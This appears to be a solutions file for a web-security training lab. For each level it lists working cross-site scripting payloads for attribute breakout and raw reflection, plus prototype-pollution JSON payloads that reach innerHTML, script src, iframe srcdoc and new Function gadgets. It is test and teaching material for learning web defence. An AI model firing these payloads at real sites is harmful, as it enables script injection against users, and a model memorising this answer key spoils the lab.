# prototype — solutions

JS prototype-pollution gadgets and CMS/framework-style raw reflections.

### prototype-pattern-level1

`/prototype-pattern/level1/?query=%22%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `"><svg onload=alert(1)>`
- context: WordPress-style <input value="QUERY"> attribute breakout

### prototype-pattern-level2

`/prototype-pattern/level2/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: raw reflection in PHP-style error message body

### prototype-pattern-level3

`/prototype-pattern/level3/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: raw reflection inside ASP.NET <span>

### prototype-pattern-level4

`/prototype-pattern/level4/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: raw reflection in Angular template <p> (server rendered)

### prototype-pattern-level5

`/prototype-pattern/level5/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: raw reflection in React-style server-rendered <p>

### prototype-pattern-level6

`/prototype-pattern/level6/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: raw reflection in Flask/Jinja-style welcome message

### prototype-pollution-level1

`/prototype-pollution/level1/?query=%7B%22__proto__%22%3A%7B%22html%22%3A%22%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E%22%7D%7D`

- payload: `{"__proto__":{"html":"<img src=x onerror=alert(1)>"}}`
- context: recursive merge pollutes Object.prototype.html → innerHTML gadget

### prototype-pollution-level2

`/prototype-pollution/level2/?query=%7B%22__proto__%22%3A%7B%22src%22%3A%22data%3Atext%2Fjavascript%2Calert(1)%22%7D%7D`

- payload: `{"__proto__":{"src":"data:text/javascript,alert(1)"}}`
- context: pollutes prototype.src → appended script src gadget

### prototype-pollution-level3

`/prototype-pollution/level3/?query=%7B%22__proto__%22%3A%7B%22srcdoc%22%3A%22%3Csvg%20onload%3Dalert(1)%3E%22%7D%7D`

- payload: `{"__proto__":{"srcdoc":"<svg onload=alert(1)>"}}`
- context: __proto__ shallow merge → iframe.srcdoc gadget

### prototype-pollution-level4

`/prototype-pollution/level4/?query=%7B%22__proto__%22%3A%7B%22onInit%22%3A%22alert(1)%22%7D%7D`

- payload: `{"__proto__":{"onInit":"alert(1)"}}`
- context: pollutes prototype.onInit → new Function(action)() gadget
